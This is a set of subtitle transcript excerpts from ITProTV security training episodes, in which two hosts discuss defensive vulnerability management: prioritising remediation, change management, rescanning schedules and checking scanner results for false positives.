00:06:24.074\nDo I do the 10?\n\n127\n00:06:24.074 --> 00:06:26.240\nOr do I do the four 6?\n\n128\n00:06:26.240 --> 00:06:32.515\nBecause, maybe those four 6.0's that\nI've returned, are really easy fixes.\n\n129\n00:06:32.515 --> 00:06:36.790\nIt's well, I didn't, I need to\nchange that default configuration,\n\n130\n00:06:36.790 --> 00:06:38.950\nI need to remove those\ndefault credentials.\n\n131\n00:06:38.950 --> 00:06:43.130\nAnd then this would be down to low,\nall right?\n\n132\n00:06:43.130 --> 00:06:47.217\nI could do them very easily but\neven though they don't give a critical\n\n133\n00:06:47.217 --> 00:06:51.938\nvulnerability, there are enough that it\nwould allow somebody to gain access to\n\n134\n00:06:51.938 --> 00:06:54.909\nmaybe pivot into a more\ncritical vulnerability.\n\n135\n00:06:54.909 --> 00:06:59.014\nBecause remember,\nsome of the complexity would be that,\n\n136\n00:06:59.014 --> 00:07:03.789\nyour, it's very high because you\nhave local access or soemthing,\n\n137\n00:07:03.789 --> 00:07:06.886\nlike the vector was local\nto get it to work but\n\n138\n00:07:06.886 --> 00:07:11.408\nif I gain access through this attack,\non this machine now I'm,\n\n139\n00:07:11.408 --> 00:07:16.826\nat least adjacent, see how these things\ncan turn into more severe attacks.\n\n140\n00:07:16.826 --> 00:07:21.810\nSo and maybe the complexity of\nremediation is very difficult.\n\n141\n00:07:21.810 --> 00:07:25.480\nThat's another factor that\nyou have to take into play.\n\n142\n00:07:25.480 --> 00:07:28.014\nIt's not gonna be easy for\nus to get in there and\n\n143\n00:07:28.014 --> 00:07:31.940\nmaybe basically disembowel our web API.\n&gt;&gt; That wouldn't be good.\n\n144\n00:07:31.940 --> 00:07:33.080\n&gt;&gt; That would be really hard.\n\n145\n00:07:33.080 --> 00:07:35.240\nMaybe we've hardcoded\ncredentials into things and\n\n146\n00:07:35.240 --> 00:07:38.900\nas soon as we take that out,\nit busts, it breaks completely.\n\n147\n00:07:39.980 --> 00:07:44.770\nSo remediating that is gonna take time,\nresources, money.\n\n148\n00:07:44.770 --> 00:07:48.440\nA lot of factors come into play\nwhen it comes to remediation.\n\n149\n00:07:48.440 --> 00:07:51.690\nIt's not just, sanitized data.\n\n150\n00:07:51.690 --> 00:07:53.310\nSometimes that's what it is.\n\n151\n00:07:53.310 --> 00:07:55.214\nAnd that's, cool, that's an easy fix.\n\n152\n00:07:55.214 --> 00:08:01.810\nSo, prioritization might be yeah,\nit's super critical that we get at this.\n\n153\n00:08:01.810 --> 00:08:05.566\nBut let's go ahead and attack these easier\nones first, get those taken care of.\n\n154\n00:08:05.566 --> 00:08:09.449\nAnd then device a plan of attack for\nremediation for\n\n155\n00:08:09.449 --> 00:08:15.400\nthe more difficult ones that have\na more complex remediation strategy.\n\n156\n00:08:15.400 --> 00:08:18.820\nSo these are things that you have to take\ninto account when you're devising your\n\n157\n00:08:18.820 --> 00:08:19.610\nremediation plan.\n\n158\n00:08:20.660 --> 00:08:23.050\nSo prioritization, very, very interesting.\n\n159\n00:08:23.050 --> 00:08:26.460\nAnything else I need\nto discuss about that?\n\n160\n00:08:26.460 --> 00:08:28.050\nBasically that's about it.\n\n161\n00:08:28.050 --> 00:08:32.150\nOnce you come up with your plan of attack,\nyou need to then\n\n162\n00:08:32.150 --> 00:08:36.610\neffectively communicate that to\neveryone that's going to be involved.\n\n163\n00:08:36.610 --> 00:08:38.110\nAnd let them know that\nthat's going to happen.\n\n164\n00:08:38.110 --> 00:08:42.150\nYou need to have effective\ncommunication and change managements.\n\n165\n00:08:43.300 --> 00:08:47.450\nSo that it's done properly,\nit has oversights, and\n\n166\n00:08:47.450 --> 00:08:52.160\nactually is a safety net for\nyou as the remediator.\n\n167\n00:08:52.160 --> 00:08:55.770\nBecause if you're doing change management\ncorrectly, you're basically submitting\n\n168\n00:08:55.770 --> 00:08:58.450\na job, or a job is being\nsubmitted to you for remediation.\n\n169\n00:08:58.450 --> 00:09:01.990\nHere was a level of attack,\nand you're an IT worker,\n\n170\n00:09:01.990 --> 00:09:04.540\nwe're gonna delegate that to Zach.\n\n171\n00:09:04.540 --> 00:09:11.700\nAnd Zach I want you to sanitize data,\nor user input in our web application.\n\n172\n00:09:11.700 --> 00:09:15.300\nZach says no problem, I gotta go back\nthrough all of where we take user input,\n\n173\n00:09:15.300 --> 00:09:19.110\nfind those spots that the vulnerability\nscanner has discovered.\n\n174\n00:09:19.110 --> 00:09:23.070\nAnd make sure the data is being sanitized\nso that when we re scan this thing\n\n175\n00:09:23.070 --> 00:09:27.570\nit doesn't show that as an input, great.\n\n176\n00:09:27.570 --> 00:09:30.350\nBut, if he doesn't get\na work order saying do this.\n\n177\n00:09:30.350 --> 00:09:34.620\nIf he doesn't get change management order\nthat says do this and it is approved.\n\n178\n00:09:34.620 --> 00:09:36.490\nOr if he doesn't submit one and\n\n179\n00:09:36.490 --> 00:09:39.050\nget it approved,\nthis is proper change management.\n\n180\n00:09:39.050 --> 00:09:42.210\nThis doesn't occur and Zach does it.\n\n181\n00:09:42.210 --> 00:09:43.260\nWell, it could be fine.\n\n182\n00:09:43.260 --> 00:09:44.550\nIt could be, yeah, like Zach did his job.\n\n183\n00:09:44.550 --> 00:09:47.740\nAnd even though he didn't get\nproper authorization to do that,\n\n184\n00:09:47.740 --> 00:09:48.760\nit wasn't really a big deal.\n\n185\n00:09:48.760 --> 00:09:53.580\nBut what if Zach's change made a different\nvulnerability, and it was exploited.\n\n186\n00:09:55.220 --> 00:09:57.020\nAnd he didn't get authorization\nto make that change.\n\n187\n00:09:57.020 --> 00:09:58.380\n&gt;&gt; That in fact tells us something that\n\n188\n00:09:58.380 --> 00:10:00.780\ncould happen if it comes to me doing this.\n\n189\n00:10:00.780 --> 00:10:02.270\n[LAUGH]\n&gt;&gt; See that could be a real problem,\n\n190\n00:10:02.270 --> 00:10:04.170\ncuz Zach's now preparing his resume.\n\n191\n00:10:04.170 --> 00:10:05.920\nRight out, that's not good.\n&gt;&gt; That's\n\n192\n00:10:05.920 --> 00:10:07.390\nnot good.\n&gt;&gt; That's bad.\n\n193\n00:10:07.390 --> 00:10:10.470\nSo proper change management is important.\n\n194\n00:10:10.470 --> 00:10:11.800\nMake sure it runs to the proper channels.\n\n195\n00:10:11.800 --> 00:10:15.480\nThis is a safety net for\nyou as the IT, the security guy, or\n\n196\n00:10:15.480 --> 00:10:17.520\nthe security girl, as it were.\n\n197\n00:10:17.520 --> 00:10:19.360\nAnd keep you out of the weeds,\n\n198\n00:10:19.360 --> 00:10:23.310\nor keep you out of the office getting\na dressdown by the man, right?\n\n199\n00:10:23.310 --> 00:10:25.250\nYou don't want that.\n&gt;&gt; No.\n\n200\n00:10:25.250 --> 00:10:27.015\n&gt;&gt; So follow change management procedures\n\n201\n00:10:27.015 --> 00:10:30.730\ncuz like I said, and it also is good about\ndocumenting things that have occurred.\n\n202\n00:10:30.730 --> 00:10:35.590\nIt creates a paper trail that you can then\ngo, hey, we did that on this web API,\n\n203\n00:10:35.590 --> 00:10:39.640\nwe found the same thing on our other\nwebsite, there was also a problem there.\n\n204\n00:10:39.640 --> 00:10:41.010\nWhat did you do, Zach?\n\n205\n00:10:41.010 --> 00:10:42.960\nJust look at the changed management.\n\n206\n00:10:42.960 --> 00:10:44.320\nFollow the paper trail, and you'll see,\n\n207\n00:10:44.320 --> 00:10:46.250\nbecause he's gonna type in\neverything that he's done.\n\n208\n00:10:46.250 --> 00:10:48.170\nI went into the code.\n\n209\n00:10:48.170 --> 00:10:49.740\nI was on this page.\n\n210\n00:10:49.740 --> 00:10:51.130\nI found this data.\n\n211\n00:10:51.130 --> 00:10:52.720\nHere is what it looked like.\n\n212\n00:10:52.720 --> 00:10:57.710\nI changed it to work this way so\nthat it had a filter\n\n213\n00:10:57.710 --> 00:11:01.430\nthat it wouldn't allow special characters\nduring user input, da, da, da, da.\n\n214\n00:11:01.430 --> 00:11:05.410\nAnd he's gonna make, basically,\ndocumentation procedure for what he did.\n\n215\n00:11:05.410 --> 00:11:09.170\nNow, all I gotta do is go, well,\nI can reproduce what Zach has done,\n\n216\n00:11:09.170 --> 00:11:13.160\ncreates a great documentation system, so\nchange management's good for that as well.\n\n217\n00:11:13.160 --> 00:11:15.880\nAnd also,\nproves the buy-in from the manager, so\n\n218\n00:11:15.880 --> 00:11:18.100\nyou just got that proper authorization.\n\n219\n00:11:18.100 --> 00:11:23.040\nSomebody with clout,\nwith juice, said, yes, do that.\n\n220\n00:11:23.040 --> 00:11:27.500\nAnything goes wrong unless you\nmade a technical blunder, but\n\n221\n00:11:27.500 --> 00:11:30.760\nnot in the fact that you did\nwhat they asked you to do.\n\n222\n00:11:30.760 --> 00:11:33.740\nIf you do what they ask you to do and\nthings go wrong, but\n\n223\n00:11:33.740 --> 00:11:36.300\nthrough no fault of your own, just because\nyou did what they asked you to do,\n\n224\n00:11:36.300 --> 00:11:38.200\nthen they've got no one but\nthemselves to blame.\n\n225\n00:11:38.200 --> 00:11:41.007\nIt's not your fault at that point.\n&gt;&gt; Could we utilize sandboxing,\n\n226\n00:11:41.007 --> 00:11:42.210\nDaniel?\n&gt;&gt; Yeah,\n\n227\n00:11:42.210 --> 00:11:45.550\nthat's actually a really good idea,\nto be honest with you.\n\n228\n00:11:45.550 --> 00:11:48.450\nTo build a sandbox environment,\nbecause think about this.\n\n229\n00:11:48.450 --> 00:11:49.940\nHow many times have you applied a patch,\n\n230\n00:11:49.940 --> 00:11:52.080\nbecause we talked about sand\nboxing in a previous episode,\n\n231\n00:11:52.080 --> 00:11:56.510\nwhat happens if you apply a patch,\nand it breaks things in production?\n\n232\n00:11:56.510 --> 00:11:59.290\nAnd email goes down for\na half an hour, how\n\n233\n00:11:59.290 --> 00:12:02.595\nhappy are people at that point in time?\n&gt;&gt;

What else?\n\n392\n00:19:53.050 --> 00:19:59.110\nDegrading functionality, again, this might\nnot stop you from doing remediation,\n\n393\n00:19:59.110 --> 00:20:02.780\nbut it might inhibit you\nfrom doing a remediation.\n\n394\n00:20:02.780 --> 00:20:05.930\nSo what I mean is, it slows down the\nnetwork to the point where people aren't\n\n395\n00:20:05.930 --> 00:20:12.470\nproductive because you're doing whatever,\nperforming intensive scans or taking up\n\n396\n00:20:12.470 --> 00:20:17.750\na lot of utilization of the bandwidth of\nthe CPU or the memory or whatever, okay?\n\n397\n00:20:17.750 --> 00:20:22.320\nUser consumer experience may be less\nthan optimal because of this, right?\n\n398\n00:20:23.630 --> 00:20:26.480\nTypically, you want to stay out of that\nbusiness because you get a bad reputation\n\n399\n00:20:26.480 --> 00:20:30.630\nin the real world and which will\nmake people not want to come and\n\n400\n00:20:30.630 --> 00:20:32.280\nuse your product and service.\n&gt;&gt; Mmhm.\n\n401\n00:20:33.620 --> 00:20:35.290\n&gt;&gt; All right, let's see here.\n\n402\n00:20:35.290 --> 00:20:40.720\nI think that's probably\nabout it when it comes to\n\n403\n00:20:40.720 --> 00:20:43.410\nwhat some of the things, at least what\nyou will need to know for the exam,\n\n404\n00:20:43.410 --> 00:20:46.210\nthat might inhibit your\nremediation process.\n\n405\n00:20:46.210 --> 00:20:49.146\nLet's move in to Frequency.\n\n406\n00:20:49.146 --> 00:20:51.940\nScanning frequency.\n\n407\n00:20:51.940 --> 00:20:53.080\nHow often do we scan?\n\n408\n00:20:54.150 --> 00:20:55.260\nCuz guess what?\n\n409\n00:20:55.260 --> 00:21:00.150\nZach, if I scan the machine, we've got our\nmachine, we run the open vase scanner and\n\n410\n00:21:00.150 --> 00:21:03.030\nit comes back with the results.\n&gt;&gt; Uh-huh\n\n411\n00:21:03.030 --> 00:21:04.870\n&gt;&gt; Now, I found my vulnerabilities,\n\n412\n00:21:04.870 --> 00:21:06.710\ncorrected file vulnerabilities.\n&gt;&gt; Yes, yes.\n\n413\n00:21:06.710 --> 00:21:08.490\n&gt;&gt; I go and I do my remediation,\n\n414\n00:21:08.490 --> 00:21:10.460\nI should be good to go, right?\n&gt;&gt; Yes.\n\n415\n00:21:10.460 --> 00:21:11.530\nMaybe not.\n\n416\n00:21:11.530 --> 00:21:15.700\nPerhaps we should do revolving scans.\n&gt;&gt; Yes, this is the idea.\n\n417\n00:21:15.700 --> 00:21:19.940\nAnd, not only that, not maybe should\nwe but we definitely should be.\n\n418\n00:21:19.940 --> 00:21:23.010\nThis is a must-do.\n\n419\n00:21:23.010 --> 00:21:27.320\nBecause here's what happened, I wrote\nmy scan, I found my vulnerabilities,\n\n420\n00:21:27.320 --> 00:21:29.150\nI performed remediation.\n\n421\n00:21:29.150 --> 00:21:31.160\nDid those remediation\ntactics actually work?\n\n422\n00:21:33.010 --> 00:21:35.780\nI assume they did, but how do I know?\n\n423\n00:21:35.780 --> 00:21:40.340\nI run a scan again to see,\ndoes it now pick up\n\n424\n00:21:40.340 --> 00:21:44.960\nthat that vulnerability is still there or\nwas my remediation tactics affected.\n\n425\n00:21:46.030 --> 00:21:49.770\nSo very important, it's not a one and\ndone operation, is all I have to say.\n\n426\n00:21:49.770 --> 00:21:52.940\nThis is something that we're\ngonna be continually doing.\n\n427\n00:21:52.940 --> 00:21:55.490\nAnd because of that,\nit goes back to our scheduling.\n\n428\n00:21:55.490 --> 00:21:58.850\nWhen should we be performing scans?\n\n429\n00:21:58.850 --> 00:22:00.530\nThat might be dictated from down on high,\n\n430\n00:22:00.530 --> 00:22:03.900\nfrom regulations, it might be\ncompany policy that we've created.\n\n431\n00:22:03.900 --> 00:22:07.220\nWhatever it is, we need to know\nwhat that is so we can do it.\n\n432\n00:22:07.220 --> 00:22:11.230\nOne of those things,\nwe might have regularly scheduled scans,\n\n433\n00:22:11.230 --> 00:22:14.450\nI scan here, but\nwhat if I make a change to my network?\n\n434\n00:22:15.740 --> 00:22:17.080\nWhat if I add a piece of hardware?\n\n435\n00:22:18.280 --> 00:22:23.220\nSo, I run my scan and next week,\nwe just bought a new San.\n\n436\n00:22:23.220 --> 00:22:25.380\nAnd I install it, and\nI spin up a server and\n\n437\n00:22:25.380 --> 00:22:29.560\nwe're gonna have a new VM cluster\nover here and do all that.\n\n438\n00:22:29.560 --> 00:22:30.980\nDid I scan those machines?\n\n439\n00:22:30.980 --> 00:22:34.010\nI didn't cause they weren't\nthere when I scanned them.\n\n440\n00:22:34.010 --> 00:22:35.350\n&gt;&gt; Did you scan them?\n\n441\n00:22:35.350 --> 00:22:37.080\n&gt;&gt; Well, I must now perform\n\n442\n00:22:37.080 --> 00:22:37.770\na scan.\n&gt;&gt; That's right.\n\n443\n00:22:37.770 --> 00:22:39.650\n&gt;&gt; Anything that's going live,\n\n444\n00:22:39.650 --> 00:22:45.320\nI should probably make this part of my\npolicy that before it becomes production,\n\n445\n00:22:45.320 --> 00:22:47.960\nwe run vulnerability\nassessment against it and\n\n446\n00:22:47.960 --> 00:22:51.921\nsee what the scanner picks up,\nremediate any problems that it finds, and\n\n447\n00:22:51.921 --> 00:22:56.700\nthen re-scan it, in the entirety,\nwith our network, see if there's any\n\n448\n00:22:56.700 --> 00:22:59.850\nconnections there that are gonna be made\nthat are gonna be a vulnerability, and\n\n449\n00:22:59.850 --> 00:23:03.710\nthen call it live at five, okay?\n&gt;&gt; [LAUGH]\n\n450\n00:23:03.710 --> 00:23:05.741\n&gt;&gt; Yeah, you think, this is just easy,\n\n451\n00:23:05.741 --> 00:23:06.569\nremediating.\n\n452\n00:23:06.569 --> 00:23:10.380\nNo, no, no, scanning frequency\ncan have some interesting things.\n\n453\n00:23:10.380 --> 00:23:12.000\n&gt;&gt; No, I like live at five,\n\n454\n00:23:12.000 --> 00:23:12.930\nI think it's perfect.\n\n455\n00:23:12.930 --> 00:23:15.780\nIt makes perfect sense.\n&gt;&gt; [LAUGH] Let's see here.\n\n456\n00:23:15.780 --> 00:23:18.130\nRevolving scans,\nyou used that terminology,\n\n457\n00:23:18.130 --> 00:23:20.860\nit's actually a technical term.\n\n458\n00:23:20.860 --> 00:23:25.450\nWhat is meant by revolving scans is\nthat we don't scan everything at once.\n\n459\n00:23:25.450 --> 00:23:29.840\nSome pieces of equipment come in and\nout of the scanning schedule.\n\n460\n00:23:29.840 --> 00:23:32.620\nSo everything's getting\nscanned ultimately but\n\n461\n00:23:32.620 --> 00:23:34.150\nnot everything is getting\nscanned at the same time.\n\n462\n00:23:34.150 --> 00:23:37.280\nAnd this can help with performance and\nnetwork utilization and\n\n463\n00:23:37.280 --> 00:23:38.480\nthings of that nature.\n\n464\n00:23:38.480 --> 00:23:40.890\nSo revolving scans might\nbe the exact fit for\n\n465\n00:23:40.890 --> 00:23:46.630\nyour organization to help keep the\nutilization of your network bandwidth and\n\n466\n00:23:46.630 --> 00:23:49.060\nCPU and Ram and all that other good stuff.\n\n467\n00:23:49.060 --> 00:23:54.281\nAll your performance issues might at\nleast come down to a more acceptable\n\n468\n00:23:54.281 --> 00:23:58.916\nlevel than if you were to just scan\nthe whole network at one time.\n\n469\n00:23:58.916 --> 00:24:03.049\nAlso set it to where it scans as\na revolving scan when the resource becomes\n\n470\n00:24:03.049 --> 00:24:04.570\navailable.\n\n471\n00:24:04.570 --> 00:24:06.761\nSo resources are available to scan this.\n\n472\n00:24:06.761 --> 00:24:09.110\nLet's go ahead and\ndo that while we have it.\n\n473\n00:24:09.110 --> 00:24:13.110\nSo maybe scans are running at night, and\nyou're only doing a specific portion.\n\n474\n00:24:13.110 --> 00:24:15.850\nAnd then, tomorrow night,\nit'll run another specific portion, and so\n\n475\n00:24:15.850 --> 00:24:16.840\non and so forth.\n\n476\n00:24:16.840 --> 00:24:20.620\nSo I'm not affecting my\nproduction performance.\n\n477\n00:24:20.620 --> 00:24:23.730\n&gt;&gt; Let's see here, because resources can\n\n478\n00:24:23.730 --> 00:24:28.770\nbe bandwidth-intensive It's also\nbetter for early detection.\n\n479\n00:24:28.770 --> 00:24:32.360\nSo the more often you scan,\nthe more likely you\n\n480\n00:24:32.360 --> 00:24:37.130\nare to detect something before\nit becomes an actual problem.\n\n481\n00:24:37.130 --> 00:24:41.210\nSo that's gonna weigh in on\nhow frequently should we scan?\n\n482\n00:24:41.210 --> 00:24:44.990\nAnd that's going to be directly\ncorrelated to your risk appetite,\n\n483\n00:24:44.990 --> 00:24:45.510\nto be honest with you.\n\n484\n00:24:45.510 --> 00:24:48.540\nIf your risk appetite is low,\nthen you're gonna scan more often.\n\n485\n00:24:48.540 --> 00:24:52.890\nIf your risk appetite is high, then, hey,\nwe live in a world where there's risk.\n\n486\n00:24:52.890 --> 00:24:53.790\nWhat are you gonna do, right?\n\n487\n00:24:53.790 --> 00:24:55.130\nAnd you might not scan as much.\n\n488\n00:24:56.260 --> 00:25:00.920\nAnd then, the continuous monitoring,\nhow do we continually monitor that?\n\n489\n00:25:00.920 --> 00:25:04.150\nWell, we can do our scheduled sans,\nlike what we saw with OpenVAS.\n\n490\n00:25:04.150 --> 00:25:06.070\nI can go in there, create that schedule.\n\n491\n00:25:06.070 --> 00:25:11.070\nAnd I continuously have\na scheduled time for going at it.\n\n492\n00:25:11.070 --> 00:25:16.790\nBut maybe I go agent, maybe I install a\nscanning agent on each one of my devices,\n\n493\n00:25:16.790 --> 00:25:20.780\nand they do their thing\na little more timely,\n\n494\n00:25:20.780 --> 00:25:23.080\na little less resource intensive as well.\n\n495\n00:25:23.080 --> 00:25:25.160\nHow do we work with continuous monitoring?\n\n496\n00:25:25.160 --> 00:25:26.950\nWhich way do we want to go?\n\n497\n00:25:26.950 --> 00:25:28.620\nAgain, that's tomato, tomatoe.\n\n498\n00:25:28.620 --> 00:25:30.530\nIt's gonna be what's right for\nyour environment?\n\n499\n00:25:30.530 --> 00:25:32.600\nWhat's gonna be right for\nyour pocket book?\n\n500\n00:25:32.600 --> 00:25:33.670\nThings of that nature.\n\n501\n00:25:33.670 --> 00:25:36.440\nBut you do have to be aware that\ncontinuous monitoring is something you\n\n502\n00:25:36.440 --> 00:25:37.020\nhave to worry about.\n\n503\n00:25:37.020 --> 00:25:38.840\nYou're gonna have to be able\nto answer a question about.\n\n504\n00:25:38.840 --> 00:25:43.720\nAnd typically they're gonna be\nasking you about frequencies and\n\n505\n00:25:43.720 --> 00:25:44.720\nways in which you are doing it.\n\n506\n00:25:44.720 --> 00:25:46.990\nAre you doing it agent-based or\nare you doing it server-based?\n\n507\n00:25:46.990 --> 00:25:48.710\nSo just keep that in mind.\n\n508\n00:25:48.710 --> 00:25:52.670\nAnd then the reports going back to\ncentralized management from those agents.\n\n509\n00:25:52.670 --> 00:25:53.310\nJust keep that in mind.\n\n510\n00:25:53.310 --> 00:25:54.520\nThat's what's happening.\n\n511\n00:25:54.520 --> 00:25:58.370\nThat the agent does the work and sends\na report back to the command server so\n\n512\n00:25:58.370 --> 00:26:00.298\nthat centralized management\ncan work its magic.\n\n513\n00:26:00.298 --> 00:26:04.740\nThat'd be great.\n&gt;&gt; Zack, I think for remediation that's\n\n514\n00:26:04.740 --> 00:26:08.400\nwhat we need to know and hopefully\nyou good folks out there are going.\n\n515\n00:26:08.400 --> 00:26:11.600\nWell, it wasn't as easy as I thought\nis was going to be but it's not so\n\n516\n00:26:11.600 --> 00:26:13.820\ndifficult that I don't understand it.\n\n517\n00:26:13.820 --> 00:26:15.330\nThat's my hope for\nyou good folks out there.\n\n518\n00:26:15.330 --> 00:26:18.530\n&gt;&gt; Vulnerability management remediation,\n\n519\n00:26:18.530 --> 00:26:19.180\ngreat episode!\n\n520\n00:26:19.180 --> 00:26:23.690\nLots of information you need for when you\ntake those exams, and before we move on\n\n521\n00:26:23.690 --> 00:26:26.480\nDaniel anything else you'd like to say?\n&gt;&gt; Let's see here I'm trying to think if\n\n522\n00:26:26.480 --> 00:26:28.110\nthere's any flash card material.\n\n523\n00:26:28.110 --> 00:26:31.990\nI think we're pretty good as long\nas you just understand that it's\n\n524\n00:26:33.930 --> 00:26:35.160\nmaybe not an easy process.\n\n525\n00:26:35.160 --> 00:26:39.180\nAnd remember the main points like\ngetting the reports set out,\n\n526\n00:26:39.180 --> 00:26:40.960\ndoing proper change management.\n\n527\n00:26:40.960 --> 00:26:46.200\nLooking for those things that might\nimpact remediation in a negative way, and\n\n528\n00:26:46.200 --> 00:26:49.710\nunderstanding all one of those topics and\nmemorizing what they are.\n\n529\n00:26:49.710 --> 00:26:51.320\nThat's gonna be the important part for\nyou.\n\n530\n00:26:51.320 --> 00:26:52.620\n&gt;&gt; Awesome advice, thanks Daniel.\n\n531\n00:26:52.620 --> 00:26:55.270\nAnd he's done a wonderful job\nputting together Plus for you.\n\n532\n00:26:55.270 --> 00:26:58.280\nThere's a whole bunch of episodes,\nmake sure you see them all.\n\n533\n00:26:58.280 --> 00:27:01.380\nAnd they'll be in the course library where\nthere's thousands of other videos that\n\n534\n00:27:01.380 --> 00:27:02.940\nare there, to help you go further.\n\n535\n00:27:02.940 --> 00:27:04.020\nCheck those out too.\n\n536\n00:27:04.020 --> 00:27:06.310\nAnd tell everybody you know about ITProTV.\n\n537\n00:27:06.310 --> 00:27:07.890\nITProTV is binge-worthy.\n\n538\n00:27:07.890 --> 00:27:08.530\nThanks for watching.\n\n539\n00:27:08.530 --> 00:27:09.960\nI'm Zach Memos.\n&gt;&gt; And I'm Daniel Lowrie.\n\n540\n00:27:09.960 --> 00:27:12.628\n&gt;&gt; And we'll see you again soon.\n\n541\n00:27:12.628 --> 00:27:18.382\n[MUSIC]\n\n542\n00:27:18.382 --> 00:27:21.120\n&gt;&gt; Thank you for watching IT Pro TV.\n\n",

00:00:22.081\nThis episode is scan results verification.\n\n9\n00:00:22.081 --> 00:00:25.422\nAnd the person who's showing us how to do\nthat, is the one and only, Daniel Lowrie.\n\n10\n00:00:25.422 --> 00:00:27.237\nHey, Daniel.\n&gt;&gt; Hey, how's it going today, Zach?\n\n11\n00:00:27.237 --> 00:00:27.904\n&gt;&gt; Good, good, good.\n\n12\n00:00:27.904 --> 00:00:28.571\n&gt;&gt; How's it going

today.\n\n15\n00:00:32.053 --> 00:00:33.827\nBut it might be a different day.\n\n16\n00:00:33.827 --> 00:00:35.334\nBut I hope that day is going well,\nas well.\n\n17\n00:00:35.334 --> 00:00:36.660\nBut today-\n&gt;&gt; It could be an evening.\n\n18\n00:00:36.660 --> 00:00:37.462\n&gt;&gt; Yeah, it could be an evening.\n\n19\n00:00:37.462 --> 00:00:40.067\nCould be a morning, a brunch, who knows?\n&gt;&gt; Yeah.\n\n20\n00:00:40.067 --> 00:00:40.690\n&gt;&gt; We never know where you're at.\n\n21\n00:00:40.690 --> 00:00:42.850\nBut we love it that you're here, anyway.\n&gt;&gt; [LAUGH] Thank you.\n\n22\n00:00:42.850 --> 00:00:44.718\n&gt;&gt; [LAUGH] We are gonna look at scanned\n\n23\n00:00:44.718 --> 00:00:49.201\nresults today because, well, you know\nwhat, we have to verify these things.\n\n24\n00:00:49.201 --> 00:00:49.731\n&gt;&gt; Mm.\n\n25\n00:00:49.731 --> 00:00:51.616\n&gt;&gt; Just because I've run a scan, and\n\n26\n00:00:51.616 --> 00:00:55.386\nmy scanners come back,\nhere's all your vulnerabilities, enjoy,\n\n27\n00:00:55.386 --> 00:00:58.445\ndoesn't mean that's 100%\naccurate all the time.\n\n28\n00:00:58.445 --> 00:01:02.803\nSo we have to look through these things,\nfigure out what is what,\n\n29\n00:01:02.803 --> 00:01:07.320\nseparate the wheat from the chafe,\nas it were, so that we can come to\n\n30\n00:01:07.320 --> 00:01:12.501\nthe culmination of what exactly does\nour threat surface actually look like?\n\n31\n00:01:12.501 --> 00:01:15.626\nEven though the vulnerability scanner\nmight be saying one thing, in reality,\n\n32\n00:01:15.626 --> 00:01:18.950\nit might be something else.\n&gt;&gt; Mm-hm, well let me ask you this.\n\n33\n00:01:18.950 --> 00:01:19.874\n&gt;&gt; [COUGH]\n\n34\n00:01:19.874 --> 00:01:20.595\n&gt;&gt; So we have false positives,\n\n35\n00:01:20.595 --> 00:01:21.303\nright?\n&gt;&gt; Yes.\n\n36\n00:01:21.303 --> 00:01:23.054\n&gt;&gt; Okay, how do we get false positives,\n\n37\n00:01:23.054 --> 00:01:24.341\nwhat exactly is that?\n&gt;&gt; Yeah,\n\n38\n00:01:24.341 --> 00:01:26.871\nthat's a great question.\n&gt;&gt; So what Zach is alluding to is\n\n39\n00:01:26.871 --> 00:01:30.683\nmy scanner has, so it says,\nhere's a bunch of vulnerabilities.\n\n40\n00:01:30.683 --> 00:01:36.563\nAnd I go, great, I'm not running\nversion 4 of that network service,\n\n41\n00:01:36.563 --> 00:01:38.823\nthat's a false positive.\n\n42\n00:01:38.823 --> 00:01:44.163\nIt said, I have found vulnerability,\nbut it's not true.\n\n43\n00:01:44.163 --> 00:01:47.918\nSomething has happened to make\nthe vulnerability scanner think that\n\n44\n00:01:47.918 --> 00:01:48.571\nwas there.\n\n45\n00:01:48.571 --> 00:01:51.376\nSome condition became true for it, and\n\n46\n00:01:51.376 --> 00:01:55.371\nit interpreted that as\nthe vulnerability being there.\n\n47\n00:01:55.371 --> 00:01:57.823\nBut in reality, it's not.\n\n48\n00:01:57.823 --> 00:02:01.862\nSo it's a good reason that we should\nbe doing the verification of these\n\n49\n00:02:01.862 --> 00:02:04.742\nvulnerabilities that\nthe scanner has produced.\n\n50\n00:02:04.742 --> 00:02:09.253\nWell my vulnerability scanner\nis a perfect being that\n\n51\n00:02:09.253 --> 00:02:12.745\nnever gets anything wrong.\n&gt;&gt; [LAUGH]\n\n52\n00:02:12.745 --> 00:02:13.788\n&gt;&gt; [LAUGH] That's not true,\n\n53\n00:02:13.788 --> 00:02:14.886\nit was created by people.\n\n54\n00:02:14.886 --> 00:02:17.416\nWe're all flawed,\neverything has its flaws in it.\n\n55\n00:02:17.416 --> 00:02:21.125\nSo we have to do our\ndue diligence to find.\n\n56\n00:02:21.125 --> 00:02:24.756\nFalse positives is a big problem\nwhen it comes to the scan.\n\n57\n00:02:24.756 --> 00:02:28.549\nYou'd hate to be running down, or chasing\nafter ghosts, when they don't even exist.\n\n58\n00:02:28.549 --> 00:02:29.356\n&gt;&gt; Mm-hm.\n\n59\n00:02:29.356 --> 00:02:31.476\n&gt;&gt; So we have to figure out whether or\n\n60\n00:02:31.476 --> 00:02:36.476\nnot every one of these things are true\nas the vulnerability scanner says it is,\n\n61\n00:02:36.476 --> 00:02:37.556\nor are they not?\n\n62\n00:02:37.556 --> 00:02:40.781\nNow we can do that really easily,\nright off the cuff, by saying,\n\n63\n00:02:40.781 --> 00:02:43.609\nI'm not running said service,\nI know that's not true.\n\n64\n00:02:43.609 --> 00:02:46.654\nSome of them can be a little more\ndifficult because you might be running\n\n65\n00:02:46.654 --> 00:02:49.610\nthe service, maybe youre not running\nthat version of the service.\n\n66\n00:02:49.610 --> 00:02:52.209\nYou have to just get into that\nwhole verification process.\n\n67\n00:02:52.209 --> 00:02:53.611\n&gt;&gt; Mm-hm.\n\n68\n00:02:53.611 --> 00:02:54.654\n&gt;&gt; Why does this happen, right?\n\n69\n00:02:54.654 --> 00:02:58.765\nThat's Zach's original question,\nwhy do we get these false positives?\n\n70\n00:02:58.765 --> 00:03:03.627\nWell because our vulnerable scanners are\nnot perfect beings that doing everything\n\n71\n00:03:03.627 --> 00:03:07.386\nexactly right every time,\nthey have their own issues, right?\n\n72\n00:03:07.386 --> 00:03:11.128\nSo maybe the plugin had an error, right?\n\n73\n00:03:11.128 --> 00:03:15.925\nSo the plugin that looks for said\nvulnerability, just had an error in it.\n\n74\n00:03:15.925 --> 00:03:17.777\nAnd you gotta update, you got to go out.\n\n75\n00:03:17.777 --> 00:03:20.853\nMaybe you don't have the latest version\nof all the plugins that you have, and\n\n76\n00:03:20.853 --> 00:03:23.856\nyou gotta do your updates, something\nlike that could cause that problem.\n\n77\n00:03:23.856 --> 00:03:25.208\n&gt;&gt; Is it unheard of to have a scanner 